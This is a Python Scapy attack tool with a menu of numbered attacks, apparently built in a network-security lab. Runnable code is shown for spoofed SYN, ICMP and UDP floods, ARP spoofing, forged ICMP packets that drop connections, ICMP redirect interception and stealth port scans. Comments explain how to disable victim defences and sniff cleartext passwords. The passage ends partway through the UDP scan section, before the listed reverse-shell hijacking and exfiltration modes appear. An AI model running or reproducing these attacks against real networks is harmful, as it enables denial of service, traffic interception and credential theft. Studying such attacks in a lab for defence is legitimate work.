from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP
from scapy.layers.http import *
from scapy.all import RandIP
import argparse # for parsing argumets and help command
from argparse import RawTextHelpFormatter # for newline
import nmap
import json
import time as time
from termcolor import colored # ex. print(colored('hello', 'red'), colored('world', 'green')) # https://www.kite.com/python/docs/termcolor.colored


# https://patorjk.com/software/taag/#p=display&f=Big%20Money-nw&t=NegroniSecurityTeam
# font Big-money-nw
print(colored('''
    $$\   $$\                                                   $$\  $$$$$$\                                          $$\   $$\            $$$$$$$$\                                
    $$$\  $$ |                                                  \__|$$  __$$\                                         \__|  $$ |           \__$$  __|                               
    $$$$\ $$ | $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$ /  \__| $$$$$$\   $$$$$$$\ $$\   $$\  $$$$$$\  $$\ $$$$$$\   $$\   $$\ $$ | $$$$$$\   $$$$$$\  $$$$$$\$$$$\  
    $$ $$\$$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$$$$$\  $$  __$$\ $$  _____|$$ |  $$ |$$  __$$\ $$ |\_$$  _|  $$ |  $$ |$$ |$$  __$$\  \____$$\ $$  _$$  _$$\ 
    $$ \$$$$ |$$$$$$$$ |$$ /  $$ |$$ |  \__|$$ /  $$ |$$ |  $$ |$$ | \____$$\ $$$$$$$$ |$$ /      $$ |  $$ |$$ |  \__|$$ |  $$ |    $$ |  $$ |$$ |$$$$$$$$ | $$$$$$$ |$$ / $$ / $$ |
    $$ |\$$$ |$$   ____|$$ |  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |$$\   $$ |$$   ____|$$ |      $$ |  $$ |$$ |      $$ |  $$ |$$\ $$ |  $$ |$$ |$$   ____|$$  __$$ |$$ | $$ | $$ |
    $$ | \$$ |\$$$$$$$\ \$$$$$$$ |$$ |      \$$$$$$  |$$ |  $$ |$$ |\$$$$$$  |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |      $$ |  \$$$$  |\$$$$$$$ |$$ |\$$$$$$$\ \$$$$$$$ |$$ | $$ | $$ |
    \__|  \__| \_______| \____$$ |\__|       \______/ \__|  \__|\__| \______/  \_______| \_______| \______/ \__|      \__|   \____/  \____$$ |\__| \_______| \_______|\__| \__| \__|
                        $$\   $$ |                                                                                                  $$\   $$ |                                      
                        \$$$$$$  |                                                                                                  \$$$$$$  |                                      
                         \______/                                                                                                    \______/                                                                                                                                  
    ''', 'yellow'))

print(colored('''
    Created by Matteo Dal Grande and Francesco Freda.
    Negroni Security Team Members.
    
    GitHub:
    https://github.com/matteodalgrande
    https://github.com/gomitolof
    ''', 'blue'))

# https://docs.python.org/3/library/argparse.html#module-argparse
parser = argparse.ArgumentParser(description=' Help section of SCAPY automated attacks tool.', formatter_class=RawTextHelpFormatter)

parser.add_argument('--srcIP', type=str, dest='srcIP', action='store',
                    help='Source IP (can be a spoofed one)')
parser.add_argument('--dstIP', type=str, dest='dstIP', action='store',
                    help='Destination IP')
parser.add_argument('--numPCK', type=int, dest='numPCK', action='store', default=10000,
                    help='Number of packets to send. default: 10000')       
parser.add_argument('--pSCAN', type=int, nargs=2, dest='pSCAN', action='store', default=[1,1024],
                    help='Range of ports to scan. default: 1 1024')
parser.add_argument('--dstPORT', type=int, dest='dstPORT', action='store', default=139,
                    help='Destination port. default:139')          
parser.add_argument('--interface', type=str, dest='interface', action='store', default="vmnet8",
                    help='Interface to use (for arp spoofing). default:vmnet8')  
parser.add_argument('--sleep', type=float, dest='sleep', action='store', default=0,
                    help='Time the system sleep between the send() of packets (default 0)')          

# ICMP            
parser.add_argument('--victimIP', type=str, dest='victimIP', action='store',
                    help='Victim IP (victim) (ICMP Redirect) (ARP Spoofing)')   
parser.add_argument('--serverIP', type=str, dest='serverIP', action='store',
                    help='Source IP (server) (ICMP Redirect)')                
parser.add_argument('--routerIP', type=str, dest='routerIP', action='store',
                    help='Router IP (gateway) (ICMP Redirect)')  
parser.add_argument('--gatewayIP', type=str, dest='gatewayIP', action='store',
                    help='Gateway IP (attacker) (ICMP Redirect)')

# 5 - ARP SPOOFING
## -victimIP just defined in ICMP
parser.add_argument('--victimMAC', type=str, dest='victimMAC', action='store',
                    help='Destination MAC of the victim (ARP Spoofing)') 
parser.add_argument('--spoofedIP', type=str, dest='spoofedIP', action='store',
                    help='Spoofed IP (ARP Spoofing - used to redirect the traffic)')
parser.add_argument('--spoofedMAC', type=str, dest='spoofedMAC', action='store',
                    help='Spoofed MAC (ARP Spoofing - used to redirect the traffic)')

# HTTP flooding
parser.add_argument('--url', type=str, dest='url', action='store',
                    help='URI like matteodalgrande.altervista.org or ')

# SSH reset
parser.add_argument('--host1', type=str, dest='host1', action='store',
                    help='Victim host 1. (SSH reset)')
parser.add_argument('--host2', type=str, dest='host2', action='store',
                    help='Victim host 2. (SSH reset)')                       


#required arguments
requiredNamed = parser.add_argument_group('Required named arguments')

requiredNamed.add_argument('--attackCODE', type=int, dest='attackCODE', action='store',
                    help='''
1: SYN Flood
    --dstIP
    --dstPORT
    --numPCK \n
2: ICMP Flood
    --dstIP
    --srcIP
    --numPCK \n
3: UDP Flood
    --dstIP
    --srcIP
    --dstPORT
    --numPCK \n
4: OS Discovery 
    --dstIP \n
5: ARP spoofing 
    --victimIP
    [--victimMAC]
    --spoofedIP
    [--spoofedMAC]
    --interface
    --numPCK \n
6: Drop Communication
    --victimIP
    --srcIP
    --numPCK 
    --sleep \n
7: ICMP Redirect 
    --victimIP
    --serverIP
    --routerIP
    --gatewayIP \n
8: TCP Connect Scan
    --dstIP
    --pSCAN 
    [--sleep] \n
9: TCP Stealth Scan ~ This technique is used to avoid port scanning detection by firewalls.
    --dstIP
    --pSCAN
    [--sleep] \n
10: XMAS Scan
    --dstIP
    --pSCAN
    [--sleep] \n
11: FIN Scan
    --dstIP
    --pSCAN
    [--sleep] \n
12: NULL Scan
    --dstIP
    --pSCAN
    [--sleep] \n
13: TCP ACK FLAG Scan ~ Statefull Firewall or not?
    --dstIP
    --pSCAN
    [--sleep] \n
14: TCP WINDOW Scan
    --dstIP
    --pSCAN
    [--sleep] \n
15: UDP Scan
    --dstIP
    --pSCAN
    [--sleep] \n
16: ARP Scan    
    --dstIP: An IP address or IP address range to scan. For example:
        - 192.168.1.1 to scan a single IP address
        - 192.168.1.1/24 to scan a range of IP addresses. \n
17: ARP spoofing RANDOM IP AND MAC
    --victimIP
    [--victimMAC]
    --interface
    --numPCK \n
18: HTTP flooding
    --url 
    --numPCK \n
19: SSH reset
    --host1
    --host2 
    --dstPORT 
    --interface \n
20: telnet reset
    --host1
    --host2 
    --dstPORT (23)
    --interface \n
21: TCP Session Hijacking Reverse Shell
    --interface 
    --dstPORT (23 telnet)\n
22: sniffer ICMP exfiltration
    --interface \n
                        ''')
args = parser.parse_args()
print("Arguments: " + str(args)) # print default value

# 1: SYN Flood
    # --dstIP
    # --dstPORT
    # --numPCK

    # SYN flood is a kind of DoS attack in which attackers send multiple SYN requests to a victim’s TCP port, 
    # but the attackers dosen’t want to finish the 3-way handshake. Attackers can either use spoofed IP address or do not continue the procedure. 
    # An attacker can exploit this attack to fill the victim’s queue that is used for half-opened connections. 
    # For instance, connections that has complete SYN, SYN-ACK, but has not yet gotten a final ACK back. When this queue is full, 
    # the victim cannot take any more connection. 

    # SYN Cookie Countermeasure: By default, Ubuntu’s SYN flooding countermeasure is turned on. This mechanism is called SYN cookie. 
    # It will kick in if the machine detects that it is under the SYN flooding attack. We can use the following sysctl command to turn it on and off:
        # sysctl -a | grep syncookies (Display the SYN cookie flag)
        # sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
        # sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)

    # The size of the queue has managed by OS setting. In Ubuntu OSes, we can check and change the setting using the following command. 
    # The OS sets this value based on the amount of the memory the system has.
        # sysctl net.ipv4.tcp_max_syn_backlog
        # net.ipv4.tcp_max_syn_backlog = 128

    # - The size of the queue: How many half-open connections can be stored in the queue can affect the
    # success rate of the attack. The size of the queue be adjusted using the following command:

        # sysctl -w net.ipv4.tcp_max_syn_backlog=100
    
    # While the attack is ongoing, you can run one of the following commands on the victim container to
    # see how many items are in the queue. One fourth of the space in the queue is
    # reserved for “proven destinations” (kernel mitigation mechanism in ubuntu 20.04[TCP kernel issue explained before]), 
    # so if we set the size to 100, its actual capacity is about 80.
        # $ netstat -tna | grep SYN_RECV | wc -l
        # $ ss -n state syn-recv sport = :80 | wc -l
    
    # Reduce the size of the half-open connection queue on the victim server, and see whether the success rate can improve.

    # - TCP cache issue:
    # On Ubuntu 20.04, if machine X has never made a TCP connection to the victim machine, when the SYN flooding attack is launched, 
    # machine X will not be able to connect into the victim machine. However, 
    # if before the attack, machine X has already made a TCP connection to the victim machine, then X seems to be “immune” to the SYN flooding attack, 
    # and can successfully connect to the victim machine during the attack. It seems that the victim machine remembers past successful connections, 
    # and uses this memory when establishing future connections with the “returning” client. This behavior does not exist in Ubuntu 16.04 and earlier versions. 
    # This is due to a mitigation of the kernel: TCP reserves one fourth of the backlog queue for “proven destinations” if SYN Cookies are disabled. 
    # After making a TCP connection from 192.168.10.90 to the server 192.168.10.100, we can see that the IP address 192.168.10.90 is remembered (cached) by 
    # the server, so they will be using the reserved slots when connections come from them, and will thus not be affected by the SYN flooding attack. 
    # To remove the effect of this mitigation method, we can run the "ip tcp metrics flush" command on the server.
        # ip tcp_metrics show
        # 192.168.10.90 age 140.552sec cwnd 10 rtt 79us rttvar 40us source 192.168.10.100
        # ip tcp_metrics flush
    
    # - TCP Retransmission issue: After sending out the SYN+ACK packet, the victim machine will wait for the ACK packet. 
    # If it does not come in time, TCP will retransmit the SYN+ACK packet. 
    # How many times it will retransmit depends on the following kernel parameters (by default, its value is 5):

        # sysctl net.ipv4.tcp_synack_retries
        # net.ipv4.tcp_synack_retries = 5
        
    # After these 5 retransmissions, TCP will remove the corresponding item from the half-open connection queue. 
    # Every time when an item is removed, a slot becomes open. Your attack packets and the legitimate TCP connection request packets will fight for this opening. 
    # Our Python program may not be fast enough, and can thus lose to the legitimate browser packet. 
    # To win the competition, we can run multiple instances of the attack program in parallel. 
    # We can also change the number of retransmission SYN+ACK retrives to decrease the number of competition.

    # - VirtualBox issue: RST packets: If you are doing this task using two VMs, i.e., launching the attack from one VM against another VM, 
    # instead of attacking a container or a real machine, from the Wireshark, you will can notice many RST packets (reset). 
    # Initially, we thought that the packets were generated from the recipient of the SYN+ACK packet, 
    # but it turns out they are generated by the NAT server in our setup. 
    # Any traffic going out of the VM in our lab setup will go through the NAT server provided by VirtualBox. 
    # For TCP, NAT creates address translation entries based on the SYN packet. In our attack, 
    # the SYN packets generated by the attacker did not go through the NAT (both attacker and victims are behind the NAT), so no NAT entry was created. 
    # When the victim sends SYN+ACK packet back to the source IP (which is randomly generated by the attacker), this packet will go out through the NAT, 
    # but because there is no prior NAT entry for this TCP connection, NAT does not know what to do, so it sends a TCP RST packet back to the victim. 
    # RST packets cause the victim to remove the data from the half-open connection queue. Therefore, while we are trying fill up this queue with the attack, 
    # VirtualBox helps the victim to remove our records from the queue. It becomes a competition between our code and the VirtualBox.
if args.attackCODE == 1:
    print("SYN Flood (Spoofed Ip) ~ DOS\n")
    try:
        if args.srcIP is None:
            for i in range(args.numPCK):
                packet = IP(src=str(RandIP()), dst=args.dstIP) / TCP(dport=args.dstPORT, flags="S") / Raw(b"X"*1024)
                send(packet, verbose=0)
        else:
            packet = IP(src=str(args.srcIP), dst=args.dstIP) / TCP(dport=args.dstPORT, flags="S") / Raw(b"X"*1024)
            send(packet, count=args.numPCK, verbose=0)
    except Exception as e:
        print(e)

# 2: ICMP Flood
    # --dstIP
    # --srcIP
    # --numPCK
if args.attackCODE == 2:
    print("ICMP Flood (Spoofed IP) ~ DOS\n")
    try:
        packet = IP(src=args.srcIP, dst=args.dstIP) / ICMP() / "1234567890"
        send(packet, count=args.numPCK, verbose=0)
    except Exception as e:
        print(e)

# 3: UDP Flood
    # --dstIP
    # --srcIP
    # --dstPORT
    # --numPCK
if args.attackCODE == 3:
    print("UDP Flood ~ DOS\n")
    try:
        for i in range(args.numPCK):
            packet = IP(src=str(RandIP()), dst=args.dstIP) / UDP(dport=args.dstPORT) / ("X" * RandByte())
            send(packet, verbose=0)
    except Exception as e:
        print(e)

#4: OS Discovery 
    # --dstIP \n
if args.attackCODE == 4:
    print("OS Discovery ~ nmap\n")
    try:
        nmapInstance = nmap.PortScanner()
        nmapInstance.scan(hosts=args.dstIP, arguments='-O --fuzz -sV')
        for i in range(len(nmapInstance[args.dstIP]['osmatch'])):
            parsed_json = json.loads(str(nmapInstance[args.dstIP]['osmatch'][i]).replace("'", "\"").replace("None", "\"\""))
            indent_json = json.dumps(parsed_json, indent=4, sort_keys=True)
            print(indent_json)
    except Exception as e:
        print(e)

#5: ARP spoofing PREDEFINED
    # --victimIP
    # [--victimMAC]
    # --spoofedIP
    # [--spoofedMAC]
    # --interface
    # --numPCK

    # Sending a flood of IP packets with predefined IP and MAC addresses in order to spoof MAC table
if args.attackCODE == 5:
    print("ARP spoofing ~ SCAPY\n")    
    try:
        victimMAC = args.victimMAC
        spoofedMAC = args.spoofedMAC

        if args.victimMAC == None:
            # try to recover victimMAC
            resp_target, unans_target = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=args.victimIP), retry=2, timeout=7, iface=args.interface)
            print("Founded MAC victimIP: " + args.victimIP + " : " + resp_target[0][1][ARP].hwsrc)
            victimMAC = str(resp_target[0][1][ARP].hwsrc)
        else:
            print("Provided MAC victimIP: " + args.victimIP + " : " +args.victimMAC)

        if args.spoofedMAC == None:
            resp_spoofed, unans_spoofed = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=args.spoofedIP), retry=2, timeout=7, iface=args.interface)
            print("Founded MAC spoofedIP: " + args.spoofedIP + " : " + resp_target[0][1][ARP].hwsrc)
            spoofedMAC = str(resp_spoofed[0][1][ARP].hwsrc)
        else:
            print("Provided MAC spoofedIP: " + args.spoofedIP + " : " +args.spoofedMAC)

        if spoofedMAC != None:         
                                            # is_at
            packet = Ether(src=spoofedMAC, dst=victimMAC) / ARP(op=2, hwsrc=spoofedMAC, psrc=args.spoofedIP, hwdst=victimMAC, pdst=args.victimIP)
            sendp(packet, count=args.numPCK, inter=2, iface=args.interface)
        else:
            print("Provide --victimMAC --victimIP --spoofedMAC --spoofedIP")

        # After finishing the ARP attack mode we should restore the network in its previous state by sending
        # multiple ARP frames to inform the target about the real Gateway addresses
                                                                                              # original mac and IP of the node  before to be soofed
        # sendp(Ether(src=originalMAC, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=args.victimIP, hwsrc=originalMAC, psrc=args.originalIP), count=5, iface=args.interface)

    except Exception as e:
        print(e)

#6: Drop Communication 
    # --victimIP
    # --srcIP
    # --numPCK
    # --sleep
if args.attackCODE == 6:
    print("Drop Communication ~\n")

    try:                
        packet1 = IP(dst=args.victimIP, src=args.srcIP) / ICMP(type=3, code=1)
        packet2 = IP(dst=args.srcIP, src=args.victimIP) / ICMP(type=3, code=1)
        ls(packet1)
        print("\n\n---------------------------------------------------------------\n\n\m")
        ls(packet2)
        for i in range(args.numPCK):
            send(packet1)
            send(packet2)
            time.sleep(args.sleep)
    except AttributeError:
        print(AttributeError)

#7: ICMP Redirect
    # --victimIP
    # --serverIP
    # --routerIP
    # --gatewayIP (attacker router)

    # sudo python3 script.py --attackCODE 7 --victimIP 192.168.10.66 --serverIP 192.168.10.98 --routerIP 192.168.10.9 --gatewayIP 192.168.10.68

    # Launching ICMP Redirect Attack
    # In the Ubuntu operating system, there is a countermeasure against the ICMP redirect attack.
    # turned off the countermeasure by configuring the victim to accept ICMP redirect messages.
        # To turn the protection on, set its value to 0
        # sysctl net.ipv4.conf.all.accept_redirects=0 #active protection
        # sysctl net.ipv4.conf.all.accept_redirects=1 #disactive protection
    
    # Verification. ICMP redirect messages will not affect the routing table; instead, it affects the routing cache.
    # Entries in the routing cache overwrite those in the routing table, until the entries expire. To display and clean
    # the cache contents, we can use the following commands:

        # Display the routing cache
            # sudo ip route show cache                        
            # [sudo] password for kali: 
            # 192.168.10.98 via 192.168.10.68 dev eth0.30 
            #     cache <redirected> expires 188sec 

        
        #  Clean the routing cache
        # # ip route flush cache

        # Please do a traceroute on the victim machine, and see whether the packet is rerouted or not.
        # mtr -n 192.168.10.98 # mtr is a command that combine the functionality of ping and traceroute together try it, it is really interesting.

    # IN KALI MACHINE:
    # Now we know that we should try to sniff the traffic using Wireshark, look for passwords transmitted in the clear (SSL not enabled) 
    # and attempt to login here with them. Before we can use scapy we should configure some settings to enable ipv4 forwarding, 
    # and NAT on Kali with iptables masquerade.
        # sudo su
        ## echo 1 > /proc/sys/net/ipv4/ip_forward
        ## iptables -t nat -A POSTROUTING -s 192.168.10.0/255.255.255.0 -o eth0.130 -j MASQUERADE

        #check
        # sudo iptables -t nat -L 
            # Chain POSTROUTING (policy ACCEPT)
            # target     prot opt source               destination         
            # MASQUERADE  all  --  192.168.10.0/24      anywhere

        # sudo sysctl -w net.ipv4.conf.all.send_redirects=0
        # sudo sysctl -w net.ipv4.conf.default.send_redirects=0
        # sudo sysctl -w net.ipv4.conf.eth0.send_redirects=0
        # sudo sysctl -w net.ipv4.ip_forward=1
if args.attackCODE == 7:
    print("ICMP Redirect ~\n")
    # https://ivanitlearning.wordpress.com/2019/05/20/icmp-redirect-attacks-with-scapy/

    # parameters
    print("Target IP(victim): " + args.victimIP)
    print("Source IP(server): " + args.serverIP)
    print("Router IP: " + args.routerIP)
    print("Gateway IP(attacker): " + args.gatewayIP)

    try:
        ip = IP(src=args.routerIP, dst=args.victimIP)
        icmp = ICMP(type=5, code=1, gw=args.gatewayIP)

        # The enclosed IP packet should be the one that triggers the redirect message.
        ip2 = IP(src=args.victimIP, dst=args.serverIP)

        ls(ip/icmp/ip2/ICMP())
        send(ip/icmp/ip2/ICMP())

    except Exception as e:
        print(e)

# 8 TCP Connect Scan
    # --dstIP
    # --pSCAN
    # [--sleep]

    # TCP connect is a three-way handshake between the client and the server. If the three-way handshake takes place, then communication has been established.
    # A client trying to connect to a server on port 80 initializes the connection by sending a TCP packet with the SYN flag set and the port to which it wants to connect (in this case port 80). 
    #   If the port is OPEN on the server and is accepting connections, it responds with a TCP packet with the SYN and ACK flags set. 
    # The connection is established by the client sending an acknowledgement ACK and RST flag in the final handshake. 
    # If this three-way handshake is completed, then the port on the server is open.
    # The client sends the first handshake using the SYN flag and port to connect to the server in a TCP packet. 
    #   If the server responds with a RST instead of a SYN-ACK, then that particular port is CLOSED on the server. 
    # https://resources.infosecinstitute.com/topic/port-scanning-using-scapy/
if args.attackCODE == 8:
    print("TCP Connect Scan ~ recognition\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))
    # Wireshark filter: tcp.flags.ack==1 && tcp.flags.syn==1
    # TCP FLAGs:
        # FIN=1 
        # SYN=2
        # RST=4
        # PSH=8
        # ACK=16 
        # URG=32

        # 0x12 = 18 --> SYN/ACK
        # 0x14 = 20 --> RST/ACK
    try:
        srcPORT = RandShort()
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):

            packet = IP(dst=args.dstIP) / TCP(sport=srcPORT, dport=destPORT, flags="S") #SYN
            response = sr1(packet, timeout=1, verbose=0)

            if response == None:
                # print("Port" + str(destPORT) + "closed!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x12:                                    #ACK-RST 
                    resetPACKET = IP(dst=args.dstIP) / TCP(sport=srcPORT, dport=destPORT, flags="AR")
                    send_rst = sr(resetPACKET, timeout=1, verbose=0)
                    print("Port " + str(destPORT) + " is open!")
                elif response.getlayer(TCP).flags == 0x14:
                    # print("Port" + str(destPORT) + "closed!")
                    continue
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)            
    except Exception as e:
        print(e)

# 9: TCP Stealth Scan # This technique is used to avoid port scanning detection by firewalls.
    # --dstIP
    # --pSCAN
    # [--sleep]

    # This technique is similar to the TCP connect scan. 
    # The client sends a TCP packet with the SYN flag set and the port number to connect to. 
    #   - If the port is open, the server responds with the SYN and ACK flags inside a TCP packet. 
    #   But this time the client sends a RST flag in a TCP packet and not RST+ACK, which was the case in the TCP connect scan. 
    # This technique is used to avoid port scanning detection by firewalls.
    # The closed port check is same as that of TCP connect scan. 
    #   The server responds with an RST flag set inside a TCP packet to indicate that the port is CLOSED on the server
if args.attackCODE == 9:
    print("TCP Stealth Scan ~ This technique is used to avoid port scanning detection by firewalls.\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))

    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):
            srcPORT = RandShort()
            packet = IP(dst=args.dstIP) / TCP(sport=srcPORT, dport=destPORT, flags="S")
            response = sr1(packet, timeout = 1, verbose=0)

            if response == None:
                print("Port" + str(destPORT) + " is Filtered!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x12:                                    #ACK-RST 
                    resetPACKET = IP(dst=args.dstIP) / TCP(sport=srcPORT, dport=destPORT, flags="R")
                    send_rst = sr(resetPACKET, timeout=0.5, verbose=0)
                    print("Port " + str(destPORT) + " is open!")
                elif response.getlayer(TCP).flags == 0x14:
                    # print("Port" + str(destPORT) + "closed!")
                    continue
            elif response.haslayer(ICMP):
                if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,2,3,9,10,13]:
                    print("Port " + str(destPORT) + " is Filtered!")      
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 10: XMAS Scan
    # --dstIP
    # --pSCAN
    # [--sleep]

    # In the XMAS scan, a TCP packet with the PSH, FIN, and URG flags set, along with the port to connect to, is sent to the server. If the port is open, then there will be no response from the server.
    # If the server responds with the RST flag set inside a TCP packet, the port is closed on the server.
    # If the server responds with the ICMP packet with an ICMP unreachable error type 3 and ICMP code 1, 2, 3, 9, 10, or 13, then the port is filtered and it cannot be inferred from the response whether the port is open or closed.
if args.attackCODE == 10:
    print("XMAS Scan\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))

    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):

            packet = IP(dst=args.dstIP) / TCP(dport=destPORT, flags="FPU")
            response = sr1(packet, timeout = 1, verbose=0)

            if response == None:
                print("Port" + str(destPORT) + " is Open|Filtered!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x14:
                    # print("Port" + str(destPORT) + "closed!")
                    continue
            elif response.haslayer(ICMP):
                if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,2,3,9,10,13]:
                    print("Port " + str(destPORT) + " is Filtered!")      
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 11: FIN Scan
    # --dstIP
    # --pSCAN
    # [--sleep]

    # The FIN scan utilizes the FIN flag inside the TCP packet, along with the port number to connect to on the server. If there is no response from the server, then the port is open.
    # If the server responds with an RST flag set in the TCP packet for the FIN scan request packet, then the port is closed on the server.
    # An ICMP packet with ICMP type 3 and code 1, 2, 3, 9, 10, or 13 in response to the FIN scan packet from the client means that the port is filtered and the port state cannot be found.
if args.attackCODE == 11:
    print("Fin Scan\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))

    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):

            packet = IP(dst=args.dstIP) / TCP(dport=destPORT, flags="F")
            response = sr1(packet, timeout = 1, verbose=0)

            if response == None:
                print("Port" + str(destPORT) + " is Open|Filtered!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x14:
                    # print("Port" + str(destPORT) + "closed!")
                    continue
            elif response.haslayer(ICMP):
                if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,2,3,9,10,13]:
                    print("Port " + str(destPORT) + " is Filtered!")      
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 12: NULL Scan
    # --dstIP
    # --pSCAN
    # [--sleep]

    # In a NULL scan, no flag is set inside the TCP packet. The TCP packet is sent along with the port number only to the server. 
    # If the server sends no response to the NULL scan packet, then that particular port is open.
    # If the server responds with the RST flag set in a TCP packet, then the port is closed on the server.
    # An ICMP error of type 3 and code 1, 2, 3, 9, 10, or 13 means the port is filtered on the server.
if args.attackCODE == 12:
    print("NULL Scan\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))

    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):

            packet = IP(dst=args.dstIP) / TCP(dport=destPORT, flags="")
            response = sr1(packet, timeout = 1, verbose=0)

            if response == None:
                print("Port" + str(destPORT) + " is Open|Filtered!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x14:
                    # print("Port" + str(destPORT) + "closed!")
                    continue
            elif response.haslayer(ICMP):
                if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,2,3,9,10,13]:
                    print("Port " + str(destPORT) + " is Filtered!")      
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 13: TCP ACK FLAG Scan --> Statefull Firewall or not?
    # --dstIP
    # --pSCAN
    # [--sleep]

    # The TCP ACK scan is not used to find the open or closed state of a port; rather, it is used to find if a stateful firewall is present on the server or not. 
    # It only tells if the port is filtered or not. This scan type cannot find the open/closed state of the port.
    # A TCP packet with the ACK flag set and the port number to connect to is sent to the server. 
    #   0 If the server responds with the RSP flag set inside a TCP packet, then the port is UNFILTERED and a stateful firewall is absent.
    #   1 If the server
    #       doesn’t respond to our TCP ACK scan packet 
    #       or if 
    #       it responds with a TCP packet with ICMP type 3 or code 1, 2, 3, 9, 10, or 13 set, then the port is FILTERED and a stateful firewall is present.
if args.attackCODE == 13:
    print("TCP ACK FLAG Scan\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))
    
    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):

            packet = IP(dst=args.dstIP) / TCP(dport=destPORT, flags="A")
            response = sr1(packet, timeout = 1, verbose=0)

            if response == None: # no response --> filtered by firewall
                print("Port" + str(destPORT) + " stateful firewall present (Filtered)!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).flags == 0x4: # RST --> unfiltered no firewall
                    print("Port " + str(destPORT) + " no firewall (Unfiltered)!")
                    continue
            elif response.haslayer(ICMP): # icmp with RST and code 1,2,3,9,10,13 --> filtered by firewall
                if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,2,3,9,10,13]:
                    print("Port " + str(destPORT) + " stateful firewall present (Filtered)!")    
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 14: TCP WINDOW Scan
    # --dstIP
    # --pSCAN
    # [--sleep]

    # A TCP window scan uses the same technique as that of TCP ACK scan. It also sends a TCP packet with the ACK flag set and the port number to connect to. But this scan type can be used to find the state of the port on the server. In a TCP ACK scan, an RST indicates an unfiltered state. But in a TCP windows scan, when an RST is received from the server, it then checks the value of the windows size. If the value of window size is positive, then the port is open on the server.
    # If the windows size of the TCP packet with the RST flag set to zero, then the port is closed on the server.
if args.attackCODE == 14:
    print("TCP WINDOW Scan\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))

    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):

            packet = IP(dst=args.dstIP) / TCP(dport=destPORT, flags="A")
            response = sr1(packet, timeout = 1, verbose=0)

            if response == None:
                print("Port" + str(destPORT) + " no response!")
                continue
            elif response.haslayer(TCP):
                if response.getlayer(TCP).window == 0:
                    print("Port " + str(destPORT) + " Closed!")
                    continue
                elif response.getlayer(TCP).window > 0:
                    print("Port " + str(destPORT) + " Open!")    
            else:
                print("CHECK port " + str(destPORT) + "!")
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 15: UDP Scan # example port 68 in 192.168.1.100
    # --dstIP
    # --pSCAN
    # [--sleep]

    # TCP is a CONNECTION-ORIENTED PROTOCOL and UDP is a CONNECTION-LESS PROTOCOL.
    # A CONNECTION-ORIENTED PROTOCOL is a protocol in which a communication channel should be available between the client and server and only then is a further packet transfer made. 
    # If there is no communication channel between the client and the server, then no further communication takes place.
    # A CONNECTION-LESS PROTOCOL is a protocol in which a packet transfer takes place without checking if there is a communication channel available between the client and the server. 
    # The data is just sent on to the destination, assuming that the destination is available.

    # The client sends a UDP packet with the port number to connect to. 
    # If the server responds to the client with a UDP packet, then that particular port is OPEN on the server.
